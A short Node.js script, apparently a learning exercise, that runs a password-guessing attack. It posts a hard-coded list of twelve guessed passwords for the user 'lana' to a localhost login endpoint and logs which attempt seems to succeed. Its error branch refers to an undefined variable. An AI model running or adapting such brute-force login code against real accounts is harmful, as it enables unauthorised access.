
let login = "lana"
let senhas = [
  "12345",
  "111",
  "222",
  "444",
  "1323",
  "1234",
  "danilo",
  "123456",
  "lana",
  "lan",
  "lana123",
  "122"
]

const axios = require('axios').default;

for(let i=0; i<senhas.length; i++){
  axios.post('http://localhost:3000/logar', {
    login: login,
    senha: senhas[i]
  })
  .then(function (response) {
    console.log(`Senha: ${senhas[i]}    logado: ${response.request._redirectable._redirectCount > 1}`)
  })
  .catch(function (error) {
    console.log(`Senha: ${senhas[i]}    logado: ${response.request._redirectable._redirectCount > 1}`)
  });
}